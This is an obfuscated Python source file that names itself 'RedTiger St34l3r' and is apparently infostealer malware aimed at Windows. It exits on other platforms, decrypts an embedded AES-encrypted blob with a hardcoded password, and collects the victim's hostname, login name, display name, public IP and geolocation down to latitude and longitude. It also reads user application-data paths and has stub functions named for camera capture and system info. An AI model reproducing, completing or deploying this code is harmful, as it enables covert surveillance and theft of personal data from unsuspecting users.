
import sys

def QFESWEAIKEUTLOENDRNSKLCNRYLRJAQATZWPLWKPZMQTBEVRUOYDJZVGCOECJJOFSEOXUFIABVMYITRDXXH():
    def PEAQLICPLMPTYCWEJABCBZUMMJYXRYDGWZICTBGKIXCXNSTYRPPJUNJPCSMX():
        if sys.platform.startswith("win"):
            return False
        else:
            return True
    
    try: 
        BTFQTIOHOHJDUBTAJCMGMUQBCRJHNULNTMPJRIHBZBFBJXQSEBEVHSTHMD = PEAQLICPLMPTYCWEJABCBZUMMJYXRYDGWZICTBGKIXCXNSTYRPPJUNJPCSMX()
        if BTFQTIOHOHJDUBTAJCMGMUQBCRJHNULNTMPJRIHBZBFBJXQSEBEVHSTHMD == True:
            return BTFQTIOHOHJDUBTAJCMGMUQBCRJHNULNTMPJRIHBZBFBJXQSEBEVHSTHMD
    except:
        return True
    
if QFESWEAIKEUTLOENDRNSKLCNRYLRJAQATZWPLWKPZMQTBEVRUOYDJZVGCOECJJOFSEOXUFIABVMYITRDXXH() == True:
    sys.exit()
    
import os
import socket
import win32api
import requests
import base64
import ctypes
import threading
import discord
import zipfile
import io
from json import loads
from urllib.request import urlopen
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

def ABKVDUATQPJVZAZYCYZVGPFMDTGWXETKZCUFXOTJRQZUCBPBCULBKVXUBGR(SQNLPZKZMWBCIJHXNJURZYQBPTDWPYKNJFYKHKCOYFKIEXCRJCYFTHG): 
    BTFQTIOHOHJDUBTAJCMGMUQBCRJHNULNTMPJRIHBZBFBJXQSEBEVHSTHMD_system_info = None
    return BTFQTIOHOHJDUBTAJCMGMUQBCRJHNULNTMPJRIHBZBFBJXQSEBEVHSTHMD_system_info

def UKSFOFWCFPPGAXWRKBCRUZCWBMNXBHJZFNMIJQTQQSEJBUNEQEMVNZTBPRUWDOYAMXDXCOQPYKPSRTALWLNBTWMXDLJWVTFT(SQNLPZKZMWBCIJHXNJURZYQBPTDWPYKNJFYKHKCOYFKIEXCRJCYFTHG):
    YPIUQEPDRXODFAIQRAWFMWTPTWXZHXRPRZHZNWTNBMIXEZTYRNMS = None
    return YPIUQEPDRXODFAIQRAWFMWTPTWXZHXRPRZHZNWTNBMIXEZTYRNMS

def CCNBLRSYNBSEQNUKLYLJALPBNSYGYRHQCNTGNVTMOTIHYCNORNWYKGHQQXKDAUBXLBJDSIALCOGODKHNF(SQNLPZKZMWBCIJHXNJURZYQBPTDWPYKNJFYKHKCOYFKIEXCRJCYFTHG):
    HYSOZZZBKJRHQMKYBOZLJYVOGLVHMZGKETLUBBEIUXHUBUHGXZJOEFIDAI = None
    return HYSOZZZBKJRHQMKYBOZLJYVOGLVHMZGKETLUBBEIUXHUBUHGXZJOEFIDAI

def DIQJDUMSKBHDAUEQPEDTXCPPWIQWHYTBHVBGRODWFGKLOREEIDQCZNBKVYVXAHSWQESEGIWCJJKZRYFQBRPFRMMQTRCM(): 
    KURPPALPPRWVTHSNVRFSXFNYEHQJKHUMYJDWNKGNMRZCTAQNJHLYQFDFLCCNWVVDMHUXVFBKG = None
    return KURPPALPPRWVTHSNVRFSXFNYEHQJKHUMYJDWNKGNMRZCTAQNJHLYQFDFLCCNWVVDMHUXVFBKG

def ZFICPVEAEGRKGKYQANZHBGHXZEBBOADZOEOXCVKOSJCRAEIYSKMSHX(SQNLPZKZMWBCIJHXNJURZYQBPTDWPYKNJFYKHKCOYFKIEXCRJCYFTHG): 
    FVHCPUFMTZFGAXDBGLHUMSSRVYSNMZXJCYJNDKUCZJPMUHQAHPGBIFALPEXLKFTTGXEOVPBKQMM = None
    OGVKTRAIFGXTEJZUPVHRAVLITJSFFAITNLKNEBZNZIQDAEYRHOMZVZPJYEGLVGSGAHJRZUULCPRVRJX = None
    ZICSJPWHZPWHHOQBVOFOJOUWSTQDJWUBOCUIQRXCLVSAVEATRJULMPKOGVCOKZEPYDQYSH = None
    NFCRVULHVDRDMVZBSZALRFJAWVFAPGOIKJYAGHFPICCPMARXZDWRERSCOKZHLGBZJJEOQZFAAAAGAJIAGVKQ = None
    BFQRRXGIGYNDAUZGETTVDOXGINBGXTGYHQEFCQXVNKLLVYMXKILA = None
    CJWEDMDLRRUFMYVQTUDSWFWIJNQZLTICBCLRDPGHYPNLGRDYFZBGWZQUJAKJWEFMELQHQSRYJLULQJVAMNMUIWIGTMLODRVOE = None
    return FVHCPUFMTZFGAXDBGLHUMSSRVYSNMZXJCYJNDKUCZJPMUHQAHPGBIFALPEXLKFTTGXEOVPBKQMM, OGVKTRAIFGXTEJZUPVHRAVLITJSFFAITNLKNEBZNZIQDAEYRHOMZVZPJYEGLVGSGAHJRZUULCPRVRJX, ZICSJPWHZPWHHOQBVOFOJOUWSTQDJWUBOCUIQRXCLVSAVEATRJULMPKOGVCOKZEPYDQYSH, NFCRVULHVDRDMVZBSZALRFJAWVFAPGOIKJYAGHFPICCPMARXZDWRERSCOKZHLGBZJJEOQZFAAAAGAJIAGVKQ, BFQRRXGIGYNDAUZGETTVDOXGINBGXTGYHQEFCQXVNKLLVYMXKILA, CJWEDMDLRRUFMYVQTUDSWFWIJNQZLTICBCLRDPGHYPNLGRDYFZBGWZQUJAKJWEFMELQHQSRYJLULQJVAMNMUIWIGTMLODRVOE

def HXCEIBTRUFFFHRWXGFQEOCXBNZVDDMZCQIZTDTHJVBCCMJRXNDKGUGKVCVWAW(SQNLPZKZMWBCIJHXNJURZYQBPTDWPYKNJFYKHKCOYFKIEXCRJCYFTHG):
    EVGQXZZMWHCWBEOLNYMWNLKVOHSIVIIHZIZWERLQBMZOJOXDPJGWIKAGBAGLVSAGABFCQSWXNS = None
    KAZWMWAGTTIOIPODHTVAWKXMTDUJVQCIEVBWZLGJVIDIDMXIEKUMGTLIQJYPOFCMYNUSKLNMGBSLFHPYRYKXYYYQQBWX = None
    UIHRAXAHYAGDYGKOCLTLYIZJUONXRHHNXOUPZJKTCKNOXFOACI = None
    return EVGQXZZMWHCWBEOLNYMWNLKVOHSIVIIHZIZWERLQBMZOJOXDPJGWIKAGBAGLVSAGABFCQSWXNS, KAZWMWAGTTIOIPODHTVAWKXMTDUJVQCIEVBWZLGJVIDIDMXIEKUMGTLIQJYPOFCMYNUSKLNMGBSLFHPYRYKXYYYQQBWX, UIHRAXAHYAGDYGKOCLTLYIZJUONXRHHNXOUPZJKTCKNOXFOACI

def GJOSVXWLKTMRXULVOQZICOYLZFXGPIZOHCZHMDWJTAYJBSJYKH(SQNLPZKZMWBCIJHXNJURZYQBPTDWPYKNJFYKHKCOYFKIEXCRJCYFTHG):
    TNKYINOOHFGIWSFSWOAXUPWHKBANUOZSTVUHOLREVIXVWGQQFUA = None
    return TNKYINOOHFGIWSFSWOAXUPWHKBANUOZSTVUHOLREVIXVWGQQFUA

def CWURKYDAADBSFXIKIXOFRTUTPXRJSOWJOPFTIPTEXLUAVWSTEIPYDOCCMVUVPCJDVPK(SQNLPZKZMWBCIJHXNJURZYQBPTDWPYKNJFYKHKCOYFKIEXCRJCYFTHG):
    BTFQTIOHOHJDUBTAJCMGMUQBCRJHNULNTMPJRIHBZBFBJXQSEBEVHSTHMD_camera_capture = None
    return BTFQTIOHOHJDUBTAJCMGMUQBCRJHNULNTMPJRIHBZBFBJXQSEBEVHSTHMD_camera_capture

def MVZASYRSKSOEGARGEWBWVBTJOSLSCROULQKGFBRPWDWSAVFOTUYNVHLCLEZJDHZELEDEQJBXGRETRIPTWYHIZEILQCCJR(SQNLPZKZMWBCIJHXNJURZYQBPTDWPYKNJFYKHKCOYFKIEXCRJCYFTHG): 
    HVIDZJWNVKPDWILRBANIEZSKUBBOHLSFVKQZGBCWXMRHVTUPVGNFNJFEOGEUBLWRPQJNOL = None
    return HVIDZJWNVKPDWILRBANIEZSKUBBOHLSFVKQZGBCWXMRHVTUPVGNFNJFEOGEUBLWRPQJNOL

def MJGPPIQLYGAZANOBHOZWKJVFNPSLZTCGQUZCCIVKOJLHJZDBSFUNWWTDCYKFCMXRZWWVLRJKXJDHIJUMMWJRXFPLLSWQRMAX(): pass
def TMBHJXFAUBGUJNCRRRAVHZAZRRVUDJDZJICXBCGQXLPABFWPEWHGGRQNFZBNITAVDRRNYIUBRAEYCDVKWHAQSWYHPRQPMOSMKIT(): pass
def LLSRBVVXNAGEVLBXYQWNZDTXXLQMIMIDNLPPBFAUKEFWIBHHPIQKXEPKHJJZQIXKGV(): pass
def DZETJFYLCYDBJIDNPXXAZLZNEXGZJISYLSVUUQSZRWAHBNMVRPIQIJLOCVTHI(): pass
def JBEZSTUMACWARUYLMKWMELFCVDAQWLNNKMZZRXJVMBQERVMZFRSXYCBOBYMXKCRVRFANKHD(): pass
def FUJRDFFXGGJWMSZUDIAHZKQNVMXBWMPEGZEBJQCLEJZXDINQRMVSOWEJMOMG(): pass
def HAXRSUYSYAVQKWUETLNWMVOEKLSAPZVPSPXCKELGEAEKGUBOYE(): pass
def QUXKWTERWBMFNCBNTOPMZFOLTPVAFUDMSCVEAHDOKJEYHZMTZHDNMKPIBAIKAFIQRVKSBYTVORVUIWZTWYAK(): pass
def CVLJGTYYCZLOEMVPGFTQOFTJDBAFZZUKCWHORGXFUWMSNQNCUKHBIFZNJGPKXXMVVKGUCNXQITMZZFCUTSNLXVMLARYAC(): pass
def HJSGTAQGKRUAZFDMZEITJGERQDDMPRMWAEHOOOECPTTOTYYUSRXCDAZJMJEWXLPSMJEHKRPAVTHHSTAYFRFMMFIMG(): pass
def PEUULYTUWUKVIGEQVEULMLOIQOPVOVRQQQZKDXEFUYTDVGXPQTRGETUNLLWJSIENXWJOSMWN(): pass
def HQIRJTEZYQBSCFNWJQUQPJUMVDKZWZUFSJMWFXURPFJFDVXSVGVMDOVIIKJSVSCHKOTIAHMKWW(): pass

def YXPPXCYRFBLQSQBWQIROJLTLMHRILCZYGEZFYDGYPVLPRROSUIGTRTPLKANEL(title):
    try:
        if sys.platform.startswith("win"):
            ctypes.windll.kernel32.SetConsoleTitleW(title)
        elif sys.platform.startswith("linux"):
            sys.stdout.write(f"\x1b]2;{title}\x07")
    except:
        pass
        
def AFHCMURFWXRSGIXHQEKRQVFQEQEIAPSFLOJBFJAXXKKRZDOXPJLBLMFRMTDZMLRREFJNPBVOF():
    try:
        if sys.platform.startswith("win"):
            os.system("cls")
        elif sys.platform.startswith("linux"):
            os.system("clear")
    except:
        pass

def QKTXEAWGAXPPTBAWOOZDPBFTUIEPUNYOSDAGDRMRSGZJEIOJKLBWFIVKRUDRDIMUDGXKDIPNDYPBXPFQBB(VCWHGHMRRHAEXMCIXSEYZBBYNNQGQFNSAGVHKYKKHNYWAWSNBFKGKUODJIRYMXNDBRTPFRTOEC, CJWOHQFCBBUDRNDMBKJCMRVOJHMARWMZZPWCASNMVMJQPFXJFUG):
    def WJFMAJEAXDDYGBYZTBORLQKXGJNYGRJQBWVZTLSGJDTLKLAVJUHIQTFQCXNCSUYABPEDWBLPLUQNXDAHVKITIFHNMKPKW(ELXMSTZLSCGFFKIKGJTXDNUEFKYLUCUBOMTSSTFNMWHRZJIVLMCUFZM, GWLESNIPDFBEGBNDABJAJURZFBTQZQQDQYWTGSCXFCYMHHCSKKOKOLUQBMZLCEERVYGVUQSYIP):
        PZQCGKJDIDAIEZKLQREUNYFIFSWEZHPZIZEXXFAZXAPJLNJFIBMFQMIXERYRORAYBLYUWWGNUJVYPYWHJMRHTRMDEOZXJW = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=GWLESNIPDFBEGBNDABJAJURZFBTQZQQDQYWTGSCXFCYMHHCSKKOKOLUQBMZLCEERVYGVUQSYIP, iterations=100000, backend=default_backend())
        if isinstance(ELXMSTZLSCGFFKIKGJTXDNUEFKYLUCUBOMTSSTFNMWHRZJIVLMCUFZM, str):  
            ELXMSTZLSCGFFKIKGJTXDNUEFKYLUCUBOMTSSTFNMWHRZJIVLMCUFZM = ELXMSTZLSCGFFKIKGJTXDNUEFKYLUCUBOMTSSTFNMWHRZJIVLMCUFZM.encode()  
        return PZQCGKJDIDAIEZKLQREUNYFIFSWEZHPZIZEXXFAZXAPJLNJFIBMFQMIXERYRORAYBLYUWWGNUJVYPYWHJMRHTRMDEOZXJW.derive(ELXMSTZLSCGFFKIKGJTXDNUEFKYLUCUBOMTSSTFNMWHRZJIVLMCUFZM)

    VCWHGHMRRHAEXMCIXSEYZBBYNNQGQFNSAGVHKYKKHNYWAWSNBFKGKUODJIRYMXNDBRTPFRTOEC_data = base64.b64decode(VCWHGHMRRHAEXMCIXSEYZBBYNNQGQFNSAGVHKYKKHNYWAWSNBFKGKUODJIRYMXNDBRTPFRTOEC)
    GWLESNIPDFBEGBNDABJAJURZFBTQZQQDQYWTGSCXFCYMHHCSKKOKOLUQBMZLCEERVYGVUQSYIP = VCWHGHMRRHAEXMCIXSEYZBBYNNQGQFNSAGVHKYKKHNYWAWSNBFKGKUODJIRYMXNDBRTPFRTOEC_data[:16]
    MTMTNXLEJTSAEYTGUMLPNTXISSYEHIQZXWIONKLZFVUGLUDUEN = VCWHGHMRRHAEXMCIXSEYZBBYNNQGQFNSAGVHKYKKHNYWAWSNBFKGKUODJIRYMXNDBRTPFRTOEC_data[16:32]
    VCWHGHMRRHAEXMCIXSEYZBBYNNQGQFNSAGVHKYKKHNYWAWSNBFKGKUODJIRYMXNDBRTPFRTOEC_data = VCWHGHMRRHAEXMCIXSEYZBBYNNQGQFNSAGVHKYKKHNYWAWSNBFKGKUODJIRYMXNDBRTPFRTOEC_data[32:]
    QACAQQJLBDPBASOWVPUUIOYWGSZZHGIDDYZVGKIQESJHTPCJTYPIIQTHOPQFIKVPYYZPQCHKBCSVQGLOQMRZGPK = WJFMAJEAXDDYGBYZTBORLQKXGJNYGRJQBWVZTLSGJDTLKLAVJUHIQTFQCXNCSUYABPEDWBLPLUQNXDAHVKITIFHNMKPKW(CJWOHQFCBBUDRNDMBKJCMRVOJHMARWMZZPWCASNMVMJQPFXJFUG, GWLESNIPDFBEGBNDABJAJURZFBTQZQQDQYWTGSCXFCYMHHCSKKOKOLUQBMZLCEERVYGVUQSYIP)
    KRAUAOEMMBIZCLYJADWOUXVJGGLAUVYJIGFRYWWWXSMSXYAXTAJCTSFJSDAJDPO = Cipher(algorithms.AES(QACAQQJLBDPBASOWVPUUIOYWGSZZHGIDDYZVGKIQESJHTPCJTYPIIQTHOPQFIKVPYYZPQCHKBCSVQGLOQMRZGPK), modes.CBC(MTMTNXLEJTSAEYTGUMLPNTXISSYEHIQZXWIONKLZFVUGLUDUEN), backend=default_backend())
    VIORQMHOYQHBKFUALNWPKMVJWZDLKSCRKXBNFUTAGWPISFQQHCQTXWTJENLSYALAZSPXTM = KRAUAOEMMBIZCLYJADWOUXVJGGLAUVYJIGFRYWWWXSMSXYAXTAJCTSFJSDAJDPO.decryptor()
    HHPBVOFDSCGSECMWIZODSGWFLQGKUOSZBNZGVINXNGTMOCLVPZUCJHWGCL = VIORQMHOYQHBKFUALNWPKMVJWZDLKSCRKXBNFUTAGWPISFQQHCQTXWTJENLSYALAZSPXTM.update(VCWHGHMRRHAEXMCIXSEYZBBYNNQGQFNSAGVHKYKKHNYWAWSNBFKGKUODJIRYMXNDBRTPFRTOEC_data) + VIORQMHOYQHBKFUALNWPKMVJWZDLKSCRKXBNFUTAGWPISFQQHCQTXWTJENLSYALAZSPXTM.finalize()
    HFVCOKRVTWJKHOBFVDTRBLJPJNEXZEFPSSVUZQADGEKJRIMAHUUTAXIGUMTDPHFVMBIBOE = padding.PKCS7(128).unpadder()
    IIVSVLDRVYABTZPSHVCTTFHXICDLUJNHESCMZMZKJPFWJVNEIQPRCUHEXUZFHDDTGGAP = HFVCOKRVTWJKHOBFVDTRBLJPJNEXZEFPSSVUZQADGEKJRIMAHUUTAXIGUMTDPHFVMBIBOE.update(HHPBVOFDSCGSECMWIZODSGWFLQGKUOSZBNZGVINXNGTMOCLVPZUCJHWGCL) + HFVCOKRVTWJKHOBFVDTRBLJPJNEXZEFPSSVUZQADGEKJRIMAHUUTAXIGUMTDPHFVMBIBOE.finalize()
    return IIVSVLDRVYABTZPSHVCTTFHXICDLUJNHESCMZMZKJPFWJVNEIQPRCUHEXUZFHDDTGGAP.decode()

YXPPXCYRFBLQSQBWQIROJLTLMHRILCZYGEZFYDGYPVLPRROSUIGTRTPLKANEL("")

try: TLEDMMOGLTNSNDNFJOADBHXIUGUFJSXLTZWFOMPIPGTJQTZOHSMUZKWXSEFNECSCCCIIKFKGSFTPYAOETTZ    = socket.gethostname()
except: TLEDMMOGLTNSNDNFJOADBHXIUGUFJSXLTZWFOMPIPGTJQTZOHSMUZKWXSEFNECSCCCIIKFKGSFTPYAOETTZ = "None"

try: YSMCCAMVSVJXNGQIPOBNLGWANJHAADXJIAQSHZNTREYKAVKRJJZODGQUDJHTUBGDWWKMSZUTTXSXC    = os.getlogin()
except: YSMCCAMVSVJXNGQIPOBNLGWANJHAADXJIAQSHZNTREYKAVKRJJZODGQUDJHTUBGDWWKMSZUTTXSXC = "None"

try: FRAPRNPUJDTUFUDBUDMDWJQZEOZWWNXSKCFOJZJCBJRSPUFGUJTFHRWHFMLJTPKBRLWAXMCHNEEVI    = win32api.GetUserNameEx(win32api.NameDisplay)
except: FRAPRNPUJDTUFUDBUDMDWJQZEOZWWNXSKCFOJZJCBJRSPUFGUJTFHRWHFMLJTPKBRLWAXMCHNEEVI = "None"

try: WSFEMIYEDDWKNKEMUNMJAAGIYYUUUFJFKYDHUUZUVSCOCBACHAHUHNNPHOJATVCURXAGIOSLVXIEMIGSTNJZ    = requests.get("https://api.ipify.org?format=json").json().get("ip", "None")
except: WSFEMIYEDDWKNKEMUNMJAAGIYYUUUFJFKYDHUUZUVSCOCBACHAHUHNNPHOJATVCURXAGIOSLVXIEMIGSTNJZ = "None"

try: TCBOYUETIOAULXLNLRCLAOVPCVNVWRCLCCMRWMYJAITANVIINDHHCX    = socket.gethostbyname(socket.gethostname())
except: TCBOYUETIOAULXLNLRCLAOVPCVNVWRCLCCMRWMYJAITANVIINDHHCX = "None"

MUANUJQCUZUHQUQHLAYHEBGWNROPLJHTCLJIJMTLBJXJSJMCVGVDWPWRZ = r"""
+b17bwAeayFuHB5BOvfTdWxH2ygK7FG0c+whXbWcXZ/CUqVHsvTJKJOEFszK0EfJWjGNUCwwwPXRrRwyVcvE12A3yAcVf4A0Vk+TH8e5dVdAbfPciHApCo9vo8qwzvhR14STuQp8mNvqbZFLNZTS3b3c7dAswjd3XrianVy4EkImJTR+bvwykHWfMB9kpTwUG6TokOo99/J67N+3zbTliA==
"""

HCGIHFTPGKHPBHZJAHNCDONGXYPYVBYNQJODIVQQBVBABWMWWGM            = "RphpJGsoGCPqMbPXcxpjwtLGQHgqKGFYKnFPPKycSOeEuidbTztsUzMtNSsQwWpHAYAHOjFZXmEMOmvCQPjbastOYTeeeIFpkFpProPxVQTelymNCKlGKBKjPbmMQubrfHSpHGOrTZNoqnJYXjqCTnjRPbOeIDNLbdnFaNt"
LIMDOJJEQIKTNFNTXZXYZYUPVVJBAJMLAPRIZVNAIHPJAVYOBSZPNNGGIEEYFCWIOUSGWTKVFINDETLPGOIZDVDCG        = "None"
DQRTDBHQCBUZQXOQYPSXWFDZXURYVYQYQAEEPUTUCVMKZVHQEELYNHMUUMNXLMGWHASFHIBMXLRSYCYJXKFJIZDOUITJMVHWTEH    = 0xa80505
FEIASJOKUVWMEETJWPBHIRWHDNGFMSSTJRPIBIKTYNSGBBRAVR = "RedTiger St34l3r"
FPGNHFYHDWZNPTRLBQAPYAHQJNHTQOOSQGEYWJPCRFGCPJHXNZACHVQHWELHEIDMKIVOIWTBBIRTAY   = "https://google.com"
WQJVAJTCANBACODWPJVAVUTZHQVJVQQJJKELJXCOZCXVOMUVDMHARBMMACNJRTRBMSAUAFCKHZQAVYSG    = "RedTiger St34l3r - github.com/loxy0dev/RedTiger-Tools"
NCRIPDJPWPFUHPWOYISXWNKJMJMAUGCTQEOGFAZPNZKCPPMCGLALXNBECLQOZHGRZLMVLSEHEPEZZWLJSF   = {"text": WQJVAJTCANBACODWPJVAVUTZHQVJVQQJJKELJXCOZCXVOMUVDMHARBMMACNJRTRBMSAUAFCKHZQAVYSG, "icon_url": FPGNHFYHDWZNPTRLBQAPYAHQJNHTQOOSQGEYWJPCRFGCPJHXNZACHVQHWELHEIDMKIVOIWTBBIRTAY}
DNIRBHUMTOZBSNZZBUYNLQABBXUTZEFZGSTCDNRVETXYAIYTBHANEWFXGXNEOCRTSAILIQWHVRHYKYHKEJHURSRBOFG    = f'`{YSMCCAMVSVJXNGQIPOBNLGWANJHAADXJIAQSHZNTREYKAVKRJJZODGQUDJHTUBGDWWKMSZUTTXSXC} "{WSFEMIYEDDWKNKEMUNMJAAGIYYUUUFJFKYDHUUZUVSCOCBACHAHUHNNPHOJATVCURXAGIOSLVXIEMIGSTNJZ}"`'
LQHEDZORDRARRIRKBYAAVWQSYMRBSWLYMBMLVVVBGOEQELSZVEATZTYJLIQNJQIUXL    = QKTXEAWGAXPPTBAWOOZDPBFTUIEPUNYOSDAGDRMRSGZJEIOJKLBWFIVKRUDRDIMUDGXKDIPNDYPBXPFQBB(MUANUJQCUZUHQUQHLAYHEBGWNROPLJHTCLJIJMTLBJXJSJMCVGVDWPWRZ, HCGIHFTPGKHPBHZJAHNCDONGXYPYVBYNQJODIVQQBVBABWMWWGM)

ONEHAYKSRNPKDDJWNLOMKYBTFTAMWQZIPNKLZOBAXFLIHDGZTQVI           = os.getenv("WINDIR", None)
BTAZDPZSGJQCBGVQRVACUMTETJKYCNJEDDHKGJMWCUVHHWWQQJRJVIGDKFVBYZJPANNNIKREBMAWH       = os.getenv('USERPROFILE', None)
UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ     = os.getenv('LOCALAPPDATA', None)
DNFCLRBFCQAUZDBGNAKFITTAPSKHQYRRYIHEEYIBJTOGLEGXWOGEPOABESOATHIFKEKP   = os.getenv('APPDATA', None)
TELGVCRJTCIFRJXEWQXBHJSMLOKJYTGCIRJIJCWBUOJIFXMQYMZJBOVSHFQXQCVXMXVUSMEWNXQZEVQXHYCV = os.getenv('ProgramFiles(x86)', None)
if TELGVCRJTCIFRJXEWQXBHJSMLOKJYTGCIRJIJCWBUOJIFXMQYMZJBOVSHFQXQCVXMXVUSMEWNXQZEVQXHYCV is None:
    TELGVCRJTCIFRJXEWQXBHJSMLOKJYTGCIRJIJCWBUOJIFXMQYMZJBOVSHFQXQCVXMXVUSMEWNXQZEVQXHYCV = os.getenv('ProgramFiles', None)

try:
    YXLTPAMPZYVGNMIPAKKOIEJLZSVGUQYLDPDTCTQQPINUDYRUJABVRAFRBDWYRCIKYWYVJYTQDZ = requests.get(f"https://{LIMDOJJEQIKTNFNTXZXYZYUPVVJBAJMLAPRIZVNAIHPJAVYOBSZPNNGGIEEYFCWIOUSGWTKVFINDETLPGOIZDVDCG}/api/ip/ip={WSFEMIYEDDWKNKEMUNMJAAGIYYUUUFJFKYDHUUZUVSCOCBACHAHUHNNPHOJATVCURXAGIOSLVXIEMIGSTNJZ}")
    OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL = YXLTPAMPZYVGNMIPAKKOIEJLZSVGUQYLDPDTCTQQPINUDYRUJABVRAFRBDWYRCIKYWYVJYTQDZ.json()

    QXECGXUEXFUDAUKZMNBPWDDAJZUESSVHHPTYCDDRKRTKJTCGRXQBFZPVATD = OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL.get('country', "None")
    QXECGXUEXFUDAUKZMNBPWDDAJZUESSVHHPTYCDDRKRTKJTCGRXQBFZPVATD_code = OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL.get('country_code', "None")
    ULKZEJHUAESCKIYAMZQDZBEBMPVBYKLYUOBMBDOQWIBVXVMLUTFOFEKCMFEZNQHQ = OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL.get('region', "None")
    ULKZEJHUAESCKIYAMZQDZBEBMPVBYKLYUOBMBDOQWIBVXVMLUTFOFEKCMFEZNQHQ_code = OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL.get('region_code', "None")
    HQNICBEASQBBZVOFREHVSISZQATAHBJDWBGXSOGCAVLMBDXLOJDF = OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL.get('zip', "None")
    MZSRJOINJQVCTYWNHANGHKQBVCWWVOVSYJPDAJAPOOUKNZPOVADOIIWUSGCULKOKOJFJKVZLPFGDBGYJDZQHLTWQFQ = OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL.get('city', "None")
    HAEPSABBSGBNTLAKHVSQJJMERTZHDFRONRCTJHCIHUIFFYHXYXIJTMQANNKUBJEKWZAEFE = OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL.get('latitude', "None")
    UKUACAFVDJEARTWELIROTTXEXYUVDESXSXYDWFBHFCNZVYDLHUJKHCUVMDEJOEPZIMEXMNRUCTUMNZMROIIWHDMDEKDGNHF = OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL.get('longitude', "None")
    SIUMPEWAFVBXIADEKXBYXLJFUVKXNRGYPQRBGDWVOHOLOOHQZK = OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL.get('timezone', "None")
    HHNJUZOULUPPAHPPMMTMOHYRBQFGXFIFHNFERYSHBNQQUFCFAJYX = OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL.get('isp', "None")
    SZEFFQNXUTHPYIOVSCCVUPMEKUMVYBMWZVMXCPWBGMDCFZXDPWVVAQXHRIREPAPHOXSCHOM = OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL.get('org', "None")
    XCHWNTLXGFLHVJYNJKYHCZIZROSLXZOSMLOFNEIAYLLQJFLBBBVJXUQYNNURLJ = OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL.get('as', "None")
except:
    YXLTPAMPZYVGNMIPAKKOIEJLZSVGUQYLDPDTCTQQPINUDYRUJABVRAFRBDWYRCIKYWYVJYTQDZ = requests.get(f"http://ip-api.com/json/{WSFEMIYEDDWKNKEMUNMJAAGIYYUUUFJFKYDHUUZUVSCOCBACHAHUHNNPHOJATVCURXAGIOSLVXIEMIGSTNJZ}")
    OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL = YXLTPAMPZYVGNMIPAKKOIEJLZSVGUQYLDPDTCTQQPINUDYRUJABVRAFRBDWYRCIKYWYVJYTQDZ.json()

    QXECGXUEXFUDAUKZMNBPWDDAJZUESSVHHPTYCDDRKRTKJTCGRXQBFZPVATD = OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL.get('country', "None")
    QXECGXUEXFUDAUKZMNBPWDDAJZUESSVHHPTYCDDRKRTKJTCGRXQBFZPVATD_code = OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL.get('countryCode', "None")
    ULKZEJHUAESCKIYAMZQDZBEBMPVBYKLYUOBMBDOQWIBVXVMLUTFOFEKCMFEZNQHQ = OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL.get('regionName', "None")
    ULKZEJHUAESCKIYAMZQDZBEBMPVBYKLYUOBMBDOQWIBVXVMLUTFOFEKCMFEZNQHQ_code = OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL.get('region', "None")
    HQNICBEASQBBZVOFREHVSISZQATAHBJDWBGXSOGCAVLMBDXLOJDF = OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL.get('zip', "None")
    MZSRJOINJQVCTYWNHANGHKQBVCWWVOVSYJPDAJAPOOUKNZPOVADOIIWUSGCULKOKOJFJKVZLPFGDBGYJDZQHLTWQFQ = OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL.get('city', "None")
    HAEPSABBSGBNTLAKHVSQJJMERTZHDFRONRCTJHCIHUIFFYHXYXIJTMQANNKUBJEKWZAEFE = OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL.get('lat', "None")
